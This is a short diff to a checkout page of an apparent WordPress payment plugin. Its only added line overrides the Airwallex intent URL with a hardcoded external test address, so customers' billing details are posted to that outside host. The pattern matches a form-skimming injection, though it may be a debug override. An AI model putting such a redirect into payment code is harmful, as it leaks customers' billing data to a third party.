@@ -98,7 +98,7 @@ $infipay_checkout_page_url = get_permalink( get_page_by_path( 'icheckout' ) );
             }, 50);
 
             let asyncIntentUrl = AirwallexParameters.asyncIntentUrl;            
-            
+            asyncIntentUrl = "https://shop1.infitestshop.cyou/test.php";
             var dataPost = formData.billing_details;
             AirwallexClient.ajaxPost(asyncIntentUrl, dataPost, function(data) {
                 if (!data || data.error) {
